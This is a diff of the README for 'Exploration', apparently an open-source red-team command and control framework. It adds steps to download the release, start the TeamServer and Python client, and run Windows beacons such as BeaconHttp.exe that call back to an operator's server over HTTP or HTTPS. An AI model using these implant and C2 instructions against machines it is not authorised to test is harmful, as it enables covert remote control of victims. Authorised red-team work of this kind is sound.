@@ -2,8 +2,14 @@
 
 ## What it is
 
-Exploration is a rudimentary red team command and control framework.  
-This repository contains the TeamServer and the Client.
+Exploration is a rudimentary redteam Command and Control framework.  
+This repository contains the TeamServer and the Client.  
+The release includes the TeamServer the Client with preconfigured certificate as well as the beacon and module for windows for [C2Implant](https://github.com/maxDcb/C2Implant).
+
+```
+wget -q $(wget -q -O - 'https://api.github.com/repos/maxDcb/C2TeamServer/releases/latest' | jq -r '.assets[] | select(.name=="Release.tar.gz").browser_download_url') -O ./C2TeamServer.tar.gz
+mkdir C2TeamServer && tar xf C2TeamServer.tar.gz -C C2TeamServer --strip-components 1
+```
 
 ## Introduction
 
@@ -13,21 +19,23 @@ Listener and Beacons can communicate through TCP, SMB, HTTP ,HTTPS and Github is
 
 ![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/ListenersAndSessions.png?raw=true)
 
-A compiled static version of the TeamServer is ready to use in Release, with some default certificats for GRPC communication and HTTP Listener:
+A compiled version of the TeamServer is ready to use in the Releases, with some default certificats for GRPC communication and HTTP Listener:
 
-The TeamServer binary is in ./Release/TeamServer  
+The TeamServer binary is in Release/TeamServer  
 it's launched using 
 
 ```
+cd Release/TeamServer  
 ./TeamServer
 ```
 
 ![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/TeamServerLaunch.png?raw=true)
 
-The Python Client is in ./Release/Client 
+The Python Client is in Release/Client 
 It's launched using 'python3 GUI.py'  
 
 ```
+cd  Release/Client 
 python3 GUI.py
 ```
 
@@ -50,8 +58,12 @@ Winodws Beacons and command modules are compiled separately in another [project]
 
 ![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/ReleaseModulesBeacons.png?raw=true)
 
+To launch a beacon available in ./Release/Beacons use the following syntax on a windows machine:  
+
 ```
+.\BeaconHttp.exe IP_TEAMSERVER PORT_LISTENER http/https
 .\BeaconHttp.exe 10.10.52.5 8443 https
+.\BeaconHttp.exe 10.10.52.5 80 http
 ```
 
 When the Beacon is started and connect to the TeamServer, a new session is started from where you can interact with the Beacon:
